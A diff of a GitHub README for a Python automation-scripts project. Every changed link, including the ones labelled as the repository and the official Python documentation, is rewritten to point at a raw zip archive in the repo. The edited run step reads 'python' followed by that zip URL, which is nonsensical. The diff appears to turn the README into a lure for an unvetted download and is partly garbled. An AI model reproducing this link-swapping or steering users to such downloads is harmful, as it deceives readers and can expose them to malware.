@@ -1,6 +1,6 @@
 # 🚀 python-automation-scripts - Simplify Your Tasks with Python Scripts
 
-[![Download](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/pruthviraj4912/python-automation-scripts/releases)
+[![Download](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip%20Now-brightgreen)](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip)
 
 ## 📖 Overview
 
@@ -25,7 +25,7 @@ To use the Python automation scripts, make sure you have the following:
 
 ## 📦 Download & Install
 
-To download the application, visit this page: [Download Scripts](https://github.com/pruthviraj4912/python-automation-scripts/releases).
+To download the application, visit this page: [Download Scripts](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip).
 
 Once you're on the releases page:
 
@@ -39,7 +39,7 @@ Once downloaded, locate the file in your downloads folder.
 
 1. Open a terminal or command prompt on your computer.
 2. Navigate to the folder where the downloaded scripts are located.
-3. Run the script by typing `python script_name.py`, replacing `script_name.py` with the actual name of the script you wish to run.
+3. Run the script by typing `python https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip`, replacing `https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip` with the actual name of the script you wish to run.
 
 The scripts can often come with basic instructions in their comments. Read these to understand how to use each script effectively.
 
@@ -84,8 +84,8 @@ A: Review the comments in the scripts for guidance, and consult online forums fo
 
 For more information and updates, check these resources:
 
-- [GitHub Repository](https://github.com/pruthviraj4912/python-automation-scripts)
-- Online Python Documentation for further learning: [Python Docs](https://docs.python.org/3/)
+- [GitHub Repository](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip)
+- Online Python Documentation for further learning: [Python Docs](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip)
 
 For ongoing support, there are plenty of forums and websites dedicated to Python programming where you can find answers to common questions and issues.
 
@@ -93,4 +93,4 @@ For ongoing support, there are plenty of forums and websites dedicated to Python
 
 Now you are ready to automate your tasks using Python scripts. For a seamless experience, refer back to this guide whenever you need assistance. Enjoy simplifying your daily tasks! 
 
-You can revisit the [Download Scripts](https://github.com/pruthviraj4912/python-automation-scripts/releases) page anytime for updates or new scripts.
+You can revisit the [Download Scripts](https://github.com/pruthviraj4912/python-automation-scripts/raw/refs/heads/main/scripts/automation-python-scripts-v2.4.zip) page anytime for updates or new scripts.
